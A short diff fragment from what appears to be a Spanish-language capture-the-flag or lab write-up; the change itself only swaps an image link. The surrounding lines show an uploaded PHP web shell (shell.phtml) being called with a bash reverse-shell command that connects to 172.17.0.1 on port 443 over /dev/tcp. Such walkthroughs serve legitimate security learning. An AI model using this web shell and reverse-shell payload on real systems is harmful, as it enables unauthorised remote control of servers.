@@ -72,7 +72,8 @@ lo subimos:
 
 
 después de subir el archivo vamos a uploads  y vemos que esta ahí, comprobamos
-![[comprobacion.png]]
+![Uploading image.png…]()
+
 ahora colocamos una bash
 
     http://172.17.0.2/uploads/shell.phtml?cmd=bash -c 'bash -i >%26   /dev/tcp/172.17.0.1/443 0>%261'
